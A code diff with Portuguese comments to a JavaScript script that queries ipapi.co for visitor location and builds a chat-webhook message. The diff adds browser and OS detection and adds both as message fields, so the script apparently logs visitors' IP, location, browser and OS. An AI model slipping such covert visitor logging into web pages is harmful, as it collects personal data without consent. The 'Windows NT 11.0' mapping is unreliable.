@@ -9,6 +9,61 @@ fetch('https://ipapi.co/json/')
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const accessTime = new Date().toLocaleString();
 
+    // Função para detectar o navegador
+    function detectBrowser(ua) {
+      if (ua.includes("Edg")) return "Microsoft Edge";
+      if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+      if (ua.includes("Chrome")) return "Google Chrome";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Firefox")) return "Mozilla Firefox";
+      if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
+      return "Navegador desconhecido";
+    }
+
+    // Função para detectar o sistema operacional + versão
+    function detectOS(ua) {
+      if (ua.includes("Windows NT 10.0")) return "Windows 10";
+      if (ua.includes("Windows NT 11.0")) return "Windows 11";
+      if (ua.includes("Windows NT 6.3")) return "Windows 8.1";
+      if (ua.includes("Windows NT 6.2")) return "Windows 8";
+      if (ua.includes("Windows NT 6.1")) return "Windows 7";
+      if (ua.includes("Windows NT 6.0")) return "Windows Vista";
+      if (ua.includes("Windows NT 5.1")) return "Windows XP";
+      if (ua.includes("Mac OS X")) {
+        const match = ua.match(/Mac OS X (\d+[_\.\d]+)/);
+        if (match) {
+          return "Mac OS X " + match[1].replace(/_/g, '.');
+        }
+        return "Mac OS X";
+      }
+      if (ua.includes("Android")) {
+        const match = ua.match(/Android\s+([\d.]+)/);
+        if (match) {
+          return "Android " + match[1];
+        }
+        return "Android";
+      }
+      if (ua.includes("iPhone")) {
+        const match = ua.match(/iPhone OS (\d+[_\d]+)/);
+        if (match) {
+          return "iOS " + match[1].replace(/_/g, '.');
+        }
+        return "iOS (iPhone)";
+      }
+      if (ua.includes("iPad")) {
+        const match = ua.match(/CPU OS (\d+[_\d]+)/);
+        if (match) {
+          return "iOS " + match[1].replace(/_/g, '.');
+        }
+        return "iOS (iPad)";
+      }
+      if (ua.includes("Linux")) return "Linux";
+      return "Sistema desconhecido";
+    }
+
+    const navegador = detectBrowser(userAgent);
+    const sistemaOperacional = detectOS(userAgent);
+
     const payload = {
       embeds: [
         {
@@ -27,8 +82,13 @@ fetch('https://ipapi.co/json/')
             },
             {
               name: "🧠 Navegador",
-              value: userAgent,
-              inline: false
+              value: navegador,
+              inline: true
+            },
+            {
+              name: "💻 Sistema Operacional",
+              value: sistemaOperacional,
+              inline: true
             },
             {
               name: "🕰️ Horário",
